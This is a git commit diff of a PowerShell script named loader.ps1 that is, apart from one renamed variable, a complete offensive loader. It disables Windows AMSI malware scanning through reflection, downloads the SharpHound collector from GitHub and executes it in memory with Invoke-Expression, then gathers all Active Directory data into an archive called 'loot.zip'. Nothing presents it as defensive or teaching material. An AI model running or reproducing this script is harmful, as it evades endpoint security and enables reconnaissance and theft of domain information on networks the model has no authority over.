34c5a43ce6b73a1e36c2436a93f7f0a76b79f630
Tyler the Pug <50224819+tylerwhardy@users.noreply.github.com>
2025-07-06 20:30:44 -0400

    Update loader.ps1

--- loader.ps1
+++ loader.ps1
@@ -2,6 +2,6 @@ $Flags = [System.Reflection.BindingFlags] "NonPublic,Static"
 $AmsiUtils = [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils")
 $Field = $AmsiUtils.GetField("amsiInitFailed", $Flags)
 $Field.SetValue($null, $true)
-$sh = Invoke-WebRequest "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1" -UseBasicParsing
-Invoke-Expression $sh.Content
+$sharpHoundCode = Invoke-WebRequest -Uri "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1" -UseBasicParsing
+Invoke-Expression $sharpHoundCode.Content
 Invoke-BloodHound -CollectionMethod All -ZipFileName loot.zip
